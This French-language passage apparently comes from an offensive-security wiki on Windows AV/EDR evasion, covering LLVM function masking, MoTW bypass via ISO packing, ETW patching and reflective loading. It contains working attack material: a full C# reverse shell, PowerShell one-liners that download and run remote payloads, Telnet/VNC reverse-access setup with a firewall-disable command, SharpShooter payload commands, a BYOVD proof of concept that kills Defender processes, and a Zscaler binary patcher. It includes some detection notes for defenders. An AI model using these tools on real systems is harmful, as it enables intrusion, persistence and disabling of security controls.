- [**Alcatraz**](https://github.com/weak1337/Alcatraz)** :** Alcatraz est un obfuscateur de binaires x64 capable d'obfusquer différents fichiers pe, notamment : .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame) : Metame est un moteur simple de code métamorphe pour des exécutables arbitraires.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator) : ROPfuscator est un framework d'obfuscation de code granulaire pour les langages pris en charge par LLVM, utilisant le ROP (return-oriented programming). ROPfuscator obfusque un programme au niveau du code assembleur en transformant les instructions classiques en chaînes ROP, contournant ainsi notre conception naturelle du flux de contrôle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt) : Nimcrypt est un Crypter PE .NET écrit en Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)** :** Inceptor est capable de convertir des EXE/DLL existants en shellcode, puis de les charger

### Auto-masquage par fonction assisté par le compilateur LLVM

Au lieu de masquer un implant entier uniquement lorsqu'il dort, un backend LLVM X86 modifié peut conserver certaines fonctions masquées par XOR lorsqu'elles sont inactives. La PoC Function Peekaboo sélectionne les noms démanglés contenant `REG_`, injecte des stubs d'entrée/sortie indépendants de la position autour du code machine final et émet un gestionnaire de masquage partagé dans `.text` ; les signatures au niveau du source et la convention d'appel Windows x64 restent inchangées.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformation du flux de contrôle du backend

Cette opération doit être effectuée après la sélection des instructions et l'optimisation, car la transformation doit couvrir **chaque retour émis** et connaître la disposition x86 exacte. Une `MachineFunctionPass` pré-émission trouve la dernière `MachineInstr::isReturn()`, la supprime afin que le chemin final tombe dans l'épilogue ajouté, et remplace les retours précédents par `JMP_1 handler`. Conservez toute la destruction de pile/frame générée par le compilateur avant chaque retour ; redirigez uniquement l'instruction de retour elle-même.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` et `X86AsmPrinter::emitFunctionBodyEnd()` émettent les stubs propres à chaque fonction, tandis que `emitEndOfAsmFile()` émet le gestionnaire. Les symboles partagés entre les étapes d'émission permettent à une branche de prologue de cibler son épilogue ultérieur ; pour un `je` proche émis manuellement, écrivez `0F 84` suivi de l'expression MC de quatre octets `target - address_after_je`. Les appels et les sauts vers le gestionnaire peuvent à la place être émis sous forme d'objets `MCInst` (`CALL64pcrel32` et `JMP_1`). Une pass doit renvoyer `false` pour une fonction non sélectionnée lorsqu'elle n'a rien modifié ; la PoC renvoie incorrectement `true` dans ce cas.<sup>[[38]](#references)[[39]](#references)</sup>

#### Métadonnées et initialisation pré-CRT

La PoC place une clé XOR et des enregistrements de 16 octets contenant un pointeur de fonction relocalisé par le loader ainsi qu'une longueur d'exécution dans `.funcmeta`. Bien que le champ C soit un `uint32_t`, le gestionnaire accède à un QWORD à l'offset `+8` de l'enregistrement, consommant la longueur et son padding, puis avance les enregistrements de `0x10`. Les noms de sections PE occupent seulement huit octets ; la recherche à l'exécution voit donc `.funcmet`. Un patcher externe ajoute un `.stub` exécutable, sauvegarde l'ancienne RVA du point d'entrée dans le stub et redirige `AddressOfEntryPoint` ; le stub PIC obtient la base de l'image depuis `gs:[0x60]` → `[PEB+0x10]`, parcourt les imports PE32+ pour résoudre un `VirtualProtect` déjà importé et s'exécute avant le CRT.<sup>[[38]](#references)[[39]](#references)</sup>

L'initialisation définit un sentinel dans `gs:[0xE8]` et appelle chaque fonction de métadonnées. Son prologue lisible en permanence enregistre le début de la fonction dans `gs:[0xF0]`, détecte le sentinel et ignore le corps encore non masqué. L'épilogue utilise ensuite `call handler` ; après que le gestionnaire a sauvegardé 13 registres (`0x68` octets), l'adresse de retour à `[rsp+0x68]` correspond à la fin de la fonction transformée ; `end - start` peut donc être écrit dans son enregistrement de métadonnées. Le stub efface le sentinel et saute vers `ImageBase + original_entry_point_RVA` une fois que tous les corps ont été masqués.<sup>[[38]](#references)[[39]](#references)</sup>

Lors d'un appel normal, le prologue appelle le même gestionnaire symétrique pour décoder le corps. Le chemin final tombe dans l'épilogue ajouté, tandis que chaque retour précédent saute directement vers le gestionnaire partagé. L'épilogue normal utilise également `jmp handler` plutôt que `call` ; après le re-masquage, le `ret` du gestionnaire consomme l'adresse de retour de l'appelant original et préserve le résultat de la fonction dans `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitive de masquage et indicateurs d'analyse

Le gestionnaire trouve l'enregistrement courant, ignore le prologue visible fixe (`0x46` octets dans cette build), modifie le reste en `PAGE_EXECUTE_READWRITE`, lui applique un XOR octet par octet avec l'octet de poids faible de la clé, puis le repasse en `PAGE_EXECUTE_READ`. La même boucle décode donc à l'entrée et encode à chaque sortie normale.<sup>[[38]](#references)[[39]](#references)</sup>

Les indicateurs à forte valeur de signal pour cette conception comprennent :<sup>[[38]](#references)[[39]](#references)</sup>

- un point d'entrée situé dans un `.stub` exécutable et une section `.funcmet` contenant une clé ainsi que des pointeurs `.text` relocalisés ;
- l'analyse pré-CRT du PEB, de la table des imports et de la table des sections, suivie d'appels via chaque pointeur de métadonnées ;
- des prologues PIC `call`/`pop` identiques et de nombreux sites de retour redirigés vers un seul gestionnaire ;
- des écritures vers `gs:[0xE8]`, `gs:[0xF0]` et `gs:[0xF8]`, suivies de transitions répétées de `VirtualProtect` et d'écritures XOR octet par octet dans des pages exécutables adossées à l'image.

Il s'agit d'une technique d'évasion des memory scanners, et non d'une protection cryptographique : le fichier patché contient toujours le corps original en clair, et un debugger peut placer un breakpoint sur `VirtualProtect` ou sur la boucle XOR afin de dumper la fonction active. Le XOR sur un seul octet, les métadonnées lisibles et la limite fixe `0x46` rendent également la récupération offline simple.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Les slots TEB de la PoC sont locaux au thread, mais les pages de code modifiées sont globales au processus. Une entrée concurrente ou récursive peut donc réappliquer les transformations aux instructions pendant qu'une autre invocation est en cours d'exécution ; les exceptions et les sorties non locales peuvent également contourner le re-masquage. Une implémentation robuste doit synchroniser les transitions, restaurer la protection effectivement renvoyée via `lpflOldProtect`, éviter les longueurs de stub codées en dur, vérifier les chemins `call` et `jmp` pour l'alignement de pile x64 et appeler `FlushInstructionCache` après la réécriture d'octets exécutables. Microsoft indique explicitement que le caller est responsable de la cohérence du cache d'instructions lorsqu'un code exécutable est modifié.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Vous avez peut-être déjà vu cet écran en téléchargeant certains exécutables depuis Internet et en les exécutant.

Microsoft Defender SmartScreen est un mécanisme de sécurité destiné à protéger l'utilisateur final contre l'exécution d'applications potentiellement malveillantes.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen fonctionne principalement selon une approche basée sur la réputation : les applications peu téléchargées déclenchent SmartScreen, qui alerte l'utilisateur final et l'empêche d'exécuter le fichier (bien que le fichier puisse toujours être exécuté en cliquant sur More Info -> Run anyway).

**MoTW** (Mark of The Web) est un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) nommé Zone.Identifier, automatiquement créé lors du téléchargement de fichiers depuis Internet, avec l'URL depuis laquelle ils ont été téléchargés.

<figure><img src="../images/image (237).png" alt=""><figcaption>Vérification de l'ADS Zone.Identifier d'un fichier téléchargé depuis Internet.</figcaption></figure>

> [!TIP]
> Il est important de noter que les exécutables signés avec un certificat de signature **de confiance** **ne déclencheront pas SmartScreen**.

Une manière très efficace d'empêcher vos payloads d'obtenir le Mark of The Web consiste à les empaqueter dans un conteneur quelconque, comme un ISO. Cela se produit parce que le Mark-of-the-Web (MOTW) **ne peut pas** être appliqué aux volumes **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) est un outil qui empaquette des payloads dans des conteneurs de sortie afin de contourner le Mark-of-the-Web.

Exemple d'utilisation :
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Voici une démonstration du contournement de SmartScreen en empaquetant des payloads dans des fichiers ISO à l'aide de [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) est un puissant mécanisme de journalisation dans Windows qui permet aux applications et aux composants système de **journaliser des événements**. Cependant, il peut également être utilisé par les produits de sécurité pour surveiller et détecter les activités malveillantes.

De la même manière qu'AMSI est désactivé (contourné), il est également possible de faire en sorte que la fonction **`EtwEventWrite`** du processus en espace utilisateur retourne immédiatement sans journaliser aucun événement. Cela se fait en patchant la fonction en mémoire afin qu'elle retourne immédiatement, ce qui désactive effectivement la journalisation ETW pour ce processus.

Vous trouverez plus d'informations dans **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) et [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Le chargement de binaires C# en mémoire est connu depuis assez longtemps et reste une excellente méthode pour exécuter vos outils de post-exploitation sans être détecté par l'AV.

Comme le payload sera chargé directement en mémoire sans toucher au disque, nous n'aurons qu'à nous préoccuper du patching d'AMSI pour l'ensemble du processus.

La plupart des frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) permettent déjà d'exécuter directement des assemblies C# en mémoire, mais il existe différentes manières de procéder :

- **Fork\&Run**

Cela consiste à **créer un nouveau processus sacrificial**, à injecter votre code malveillant de post-exploitation dans ce nouveau processus, à exécuter votre code malveillant puis, une fois terminé, à supprimer le nouveau processus. Cette méthode présente des avantages et des inconvénients. L'avantage de la méthode fork and run est que l'exécution a lieu **en dehors de** notre processus Beacon implant. Cela signifie que si quelque chose se passe mal ou est détecté lors de notre action de post-exploitation, il y a une **bien plus grande probabilité** que notre **implant survive.** L'inconvénient est que vous avez une **plus grande probabilité** d'être détecté par les **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Il s'agit d'injecter le code malveillant de post-exploitation **dans son propre processus**. Ainsi, vous pouvez éviter d'avoir à créer un nouveau processus et à le faire analyser par l'AV, mais l'inconvénient est que si quelque chose se passe mal lors de l'exécution de votre payload, il y a une **bien plus grande probabilité** de **perdre votre beacon**, car celui-ci pourrait planter.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Si vous souhaitez en savoir plus sur le chargement d'Assembly C#, consultez cet article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ainsi que leur InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Vous pouvez également charger des Assemblies C# **depuis PowerShell**. Consultez [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) et la [vidéo de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Comme proposé dans [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), il est possible d'exécuter du code malveillant à l'aide d'autres langages en donnant à la machine compromise un accès **à l'environnement de l'interpréteur installé sur le partage SMB contrôlé par l'Attacker**.

En autorisant l'accès aux binaires de l'interpréteur et à l'environnement sur le partage SMB, vous pouvez **exécuter du code arbitraire dans ces langages en mémoire** sur la machine compromise.

Le dépôt indique que Defender analyse toujours les scripts, mais qu'en utilisant Go, Java, PHP, etc., nous avons **davantage de flexibilité pour contourner les signatures statiques**. Les tests effectués avec des scripts de reverse shell aléatoires et non obfusqués dans ces langages se sont révélés concluants.

## TokenStomping

Le token stomping manipule l'access token d'un produit de sécurité tel qu'un EDR ou un AV. La réduction des privilèges du token peut laisser le processus s'exécuter tout en l'empêchant d'effectuer des actions d'inspection ou de remédiation nécessitant des privilèges.

Pour empêcher cela, Windows pourrait **empêcher les processus externes** d'obtenir des handles sur les tokens des processus de sécurité.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Comme décrit dans [**cet article de blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), il est facile de simplement déployer Chrome Remote Desktop sur le PC d'une victime, puis de l'utiliser pour en prendre le contrôle et maintenir la persistence :<sup>[[35]](#references)</sup>
1. Téléchargez-le depuis https://remotedesktop.google.com/, cliquez sur « Set up via SSH », puis cliquez sur le fichier MSI pour Windows afin de télécharger le fichier MSI.
2. Exécutez silencieusement l'installateur sur la machine victime (des droits administrateur sont requis) : `msiexec /i chromeremotedesktophost.msi /qn`
3. Retournez sur la page Chrome Remote Desktop et cliquez sur Next. L'assistant vous demandera ensuite de vous authentifier ; cliquez sur le bouton Authorize pour continuer.
4. Exécutez la commande fournie avec les ajustements requis : `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (le paramètre `--pin` définit le PIN sans utiliser l'interface graphique).


## Advanced Evasion

L'Evasion est un sujet très complexe. Il faut parfois prendre en compte de nombreuses sources de télémétrie différentes au sein d'un même système ; il est donc pratiquement impossible de rester complètement indétectable dans des environnements matures.

Chaque environnement auquel vous serez confronté aura ses propres forces et faiblesses.

Je vous encourage vivement à regarder cette présentation de [@ATTL4S](https://twitter.com/DaniLJ94), afin d'acquérir une première approche des techniques d'Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

C'est également une autre excellente présentation de [@mariuszbit](https://twitter.com/mariuszbit) sur l'Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Vous pouvez utiliser [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), qui **supprimera des parties du binaire** jusqu'à **identifier quelle partie Defender** considère comme malveillante et vous la signalera.\
Un autre outil qui fait **la même chose est** [**avred**](https://github.com/dobin/avred), avec un service web disponible sur [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Jusqu'à Windows10, toutes les versions de Windows incluaient un **serveur Telnet** que vous pouviez installer (en tant qu'administrateur) en exécutant :
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faites-le **démarrer** au démarrage du système et **exécutez**-le maintenant :
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Modifier le port telnet** (furtivité) **et désactiver le pare-feu** :
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Téléchargez-le depuis : [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (vous voulez les téléchargements binaires, pas le setup)

**SUR L’HÔTE** : Exécutez _**winvnc.exe**_ et configurez le serveur :

- Activez l’option _Disable TrayIcon_
- Définissez un mot de passe dans _VNC Password_
- Définissez un mot de passe dans _View-Only Password_

Ensuite, déplacez le binaire _**winvnc.exe**_ et le fichier **UltraVNC.ini** **nouvellement** créé dans la **victim**

#### **Connexion reverse**

L’**attaquant** doit **exécuter dans** son **hôte** le binaire `vncviewer.exe -listen 5900` afin d’être **préparé** à recevoir une **connexion VNC** reverse. Ensuite, dans la **victim** : démarrez le daemon winvnc `winvnc.exe -run` et exécutez `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**AVERTISSEMENT :** Pour rester furtif, vous ne devez pas effectuer certaines actions

- Ne démarrez pas `winvnc` s’il est déjà en cours d’exécution, sinon vous déclencherez une [popup](https://i.imgur.com/1SROTTl.png). Vérifiez s’il est en cours d’exécution avec `tasklist | findstr winvnc`
- Ne démarrez pas `winvnc` sans `UltraVNC.ini` dans le même répertoire, sinon [la fenêtre de configuration](https://i.imgur.com/rfMQWcf.png) s’ouvrira
- N’exécutez pas `winvnc -h` pour obtenir de l’aide, sinon vous déclencherez une [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Téléchargez-le depuis : [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dans GreatSCT :
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Maintenant, **démarrez le lister** avec `msfconsole -r file.rc` et **exécutez** le **payload XML** avec :
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Le Defender actuel terminera le processus très rapidement.**

### Compiler notre propre reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Premier C# Revershell

Compilez-le avec :
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Utilisez-le avec :
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# avec un compilateur
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Téléchargement et exécution automatiques:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste d'obfuscateurs C# : [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Utiliser python pour l’exemple de build injectors :

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Autres outils
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Plus

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Désactivation de l’AV/EDR depuis le kernel

Storm-2603 a utilisé un petit utilitaire console connu sous le nom d’**Antivirus Terminator** pour désactiver les protections des endpoints avant de déployer un ransomware. L’outil apporte son **propre driver vulnérable mais *signé*** et l’exploite pour effectuer des opérations privilégiées dans le kernel que même les services AV Protected-Process-Light (PPL) ne peuvent pas bloquer.<sup>[[12]](#references)</sup>

Points clés
1. **Driver signé** : le fichier livré sur le disque est `ServiceMouse.sys`, mais le binaire est en réalité le driver légitimement signé `AToolsKrnl64.sys` d’“System In-Depth Analysis Toolkit” d’Antiy Labs. Comme le driver possède une signature Microsoft valide, il se charge même lorsque Driver-Signature-Enforcement (DSE) est activé.
2. **Installation du service** :
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La première ligne enregistre le driver comme **service kernel** et la seconde le démarre afin que `\\.\ServiceMouse` devienne accessible depuis le user land.
3. **IOCTLs exposés par le driver**
| Code IOCTL | Capacité                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminer un processus arbitraire par PID (utilisé pour tuer les services Defender/EDR) |
| `0x990000D0` | Supprimer un fichier arbitraire sur le disque |
| `0x990001D0` | Décharger le driver et supprimer le service |

Proof-of-concept minimal en C :
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Pourquoi cela fonctionne** : BYOVD contourne entièrement les protections user-mode ; le code qui s’exécute dans le kernel peut ouvrir des processus *protégés*, les terminer ou modifier des objets du kernel, quels que soient PPL/PP, ELAM ou les autres fonctionnalités de hardening.

Détection / Mitigation
•  Activer la vulnerable-driver block list de Microsoft (`HVCI`, `Smart App Control`) afin que Windows refuse de charger `AToolsKrnl64.sys`.
•  Surveiller la création de nouveaux services *kernel* et déclencher une alerte lorsqu’un driver est chargé depuis un répertoire accessible en écriture à tous ou n’est pas présent dans l’allow-list.
•  Rechercher les handles user-mode vers des objets device personnalisés suivis d’appels `DeviceIoControl` suspects.

### Contourner les vérifications de posture de Zscaler Client Connector via le patching de binaires sur disque

Le **Client Connector** de Zscaler applique localement des règles de posture de l’appareil et s’appuie sur Windows RPC pour communiquer les résultats aux autres composants. Deux choix de conception faibles rendent possible un bypass complet :

1. L’évaluation de la posture a lieu **entièrement côté client** (un booléen est envoyé au serveur).
2. Les endpoints RPC internes vérifient uniquement que l’exécutable connecté est **signé par Zscaler** (via `WinVerifyTrust`).<sup>[[11]](#references)</sup>

En **patchant quatre binaires signés sur le disque**, les deux mécanismes peuvent être neutralisés :

| Binaire | Logique originale patchée | Résultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Retourne toujours `1`, de sorte que chaque vérification soit conforme |
| `ZSAService.exe` | Appel indirect à `WinVerifyTrust` | NOP-ed ⇒ n’importe quel processus, même non signé, peut se connecter aux pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Remplacé par `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Vérifications d’intégrité du tunnel | Court-circuitées |

Extrait minimal du patcher :
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Après avoir remplacé les fichiers d'origine et redémarré la pile de services :

* **Tous** les contrôles de posture affichent **vert/conforme**.
* Les binaires non signés ou modifiés peuvent ouvrir les endpoints RPC de named pipes (par exemple, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'hôte compromis obtient un accès sans restriction au réseau interne défini par les politiques Zscaler.

Cette étude de cas démontre que des décisions de confiance prises purement côté client et de simples vérifications de signature peuvent être contournées avec quelques patches d'octets.

## Abus d'une fonctionnalité de confiance de Microsoft Defender `BTR.sys`

Le pilote **Boot-Time Removal** de Defender constitue un contre-exemple utile au BYOVD classique. `BTR.sys` est un composant légitime de remédiation signé par Microsoft, dépourvu de bug de corruption mémoire et d'interface IOCTL ; après avoir obtenu un accès administrateur et `SeLoadDriverPrivilege`, un opérateur peut plutôt falsifier sa transaction privée de remédiation et obtenir les opérations prévues sur les fichiers et le registre en Ring-0. Il s'agit d'une **primitive de neutralisation post-compromission d'AV/EDR, et non d'un accès initial ou d'une élévation de privilèges**, et le pilote peut être extrait de la propre ressource `BOOTTIMETOOL` de `MpEngine.dll` de la cible au lieu d'importer un pilote tiers voyant.<sup>[[36]](#references)</sup>

### Préparation du pilote à exécution unique

Defender dépose normalement la ressource sous la forme d'un fichier `[a-z]{8}.sys` aléatoire et enregistre un service kernel portant un nom similaire. `DriverEntry` lit la valeur `Args` du service, ouvre l'ADS NTFS référencé, déchiffre et valide la liste d'actions, écrit les retours, puis renvoie `0xC0000056` (`STATUS_DELETE_PENDING`) après une exécution réussie afin que le pilote soit déchargé au lieu de rester résident. Un service falsifié présente les valeurs caractéristiques suivantes.<sup>[[36]](#references)[[37]](#references)</sup>
```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```
